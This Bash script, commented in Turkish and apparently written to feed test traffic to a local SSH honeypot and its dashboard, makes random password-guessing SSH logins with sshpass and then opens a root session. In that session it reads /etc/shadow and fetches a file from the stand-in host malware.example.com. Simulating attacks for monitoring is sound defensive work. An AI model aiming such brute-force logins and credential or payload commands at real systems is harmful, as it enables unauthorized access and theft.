#!/bin/bash

HOST="127.0.0.1"
PORT="2222"
PASSWORDS=("123456" "admin" "password" "root" "qwerty" "iloveyou")
USERNAMES=("root" "admin" "user" "test")
SUCCESS_PASS="root"
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -o ConnectTimeout=3"

echo "=== Otomatik Saldırı Simülasyonu Başlıyor ==="
echo ""

# Başarısız denemeler
for i in {1..5}; do
    USER=${USERNAMES[$RANDOM % ${#USERNAMES[@]}]}
    PASS=${PASSWORDS[$RANDOM % ${#PASSWORDS[@]}]}
    echo "[FAIL] Deneniyor: $USER:$PASS"
    sshpass -p "$PASS" ssh $SSH_OPTS -p "$PORT" "$USER@$HOST" exit 2>/dev/null
    sleep 0.5
done

# Başarılı giriş ve komutlar
echo ""
echo "[SUCCESS] Başarılı giriş yapılıyor: root:root"
sshpass -p "$SUCCESS_PASS" ssh $SSH_OPTS -p "$PORT" root@$HOST << 'EOF'
ls -la
cat /etc/shadow
wget http://malware.example.com/badfile.sh
uname -a
ps aux
EOF

echo ""
echo "=== Simülasyon tamamlandı. Dashboard'u kontrol et: http://localhost:5000 ==="